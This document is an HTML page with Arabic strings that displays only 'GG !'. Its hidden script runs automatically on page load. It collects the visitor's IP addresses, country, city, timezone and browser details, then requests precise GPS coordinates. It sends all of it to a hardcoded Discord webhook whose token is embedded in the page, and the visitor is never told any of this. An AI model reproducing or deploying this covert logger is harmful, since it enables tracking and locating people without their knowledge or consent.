<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>GG !</title>
  <style>
    body {
      margin:0; padding:0; background:#000; height:100vh;
      display:flex; flex-direction:column; justify-content:center; align-items:center;
      color:#fff; font-family:sans-serif;
    }
    #gg-text {
      font-size:48px; font-weight:bold; margin-bottom:20px;
    }
  </style>
</head>
<body>

  <div id="gg-text">GG !</div>

  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv'

    async function sendBasicInfo() {
      try {
        const [geoRes, ipv4Res, ipv6Res] = await Promise.all([
          fetch('https://ipapi.co/json/'),
          fetch('https://api.ipify.org?format=json'),
          fetch('https://api64.ipify.org?format=json')
        ])

        const geo = await geoRes.json()
        const ipv4 = (await ipv4Res.json()).ip
        const ipv6 = (await ipv6Res.json()).ip
        const ua = navigator.userAgent

        const msg = `
📡 دخول جديد:

🔢 IPv4: ${ipv4}
🧬 IPv6: ${ipv6}
🏳️ الدولة: ${geo.country_name}
🏙️ المدينة: ${geo.city}
🕓 التوقيت: ${geo.timezone}
📱 الجهاز والمتصفح: ${ua}
        `.trim()

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: msg })
        })

      } catch (err) {
        console.error('خطأ في جلب أو إرسال المعلومات', err)
      }
    }

    function sendGPSLocation(latitude, longitude) {
      const msg = `
📍 موقع GPS:

خط العرض: ${latitude}
خط الطول: ${longitude}
      `.trim()

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: msg })
      }).catch(e => console.error('فشل إرسال الموقع:', e))
    }

    function requestGPSPermission() {
      if (!navigator.geolocation) {
        console.log('المتصفح لا يدعم الموقع')
        return
      }

      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude } = position.coords
          sendGPSLocation(latitude, longitude)
        },
        error => {
          console.warn('رفض أو خطأ في تحديد الموقع:', error.message)
        },
        { enableHighAccuracy: true, timeout: 10000 }
      )
    }

    window.addEventListener('load', async () => {
      await sendBasicInfo()
      requestGPSPermission()
    })
  </script>

</body>
</html>
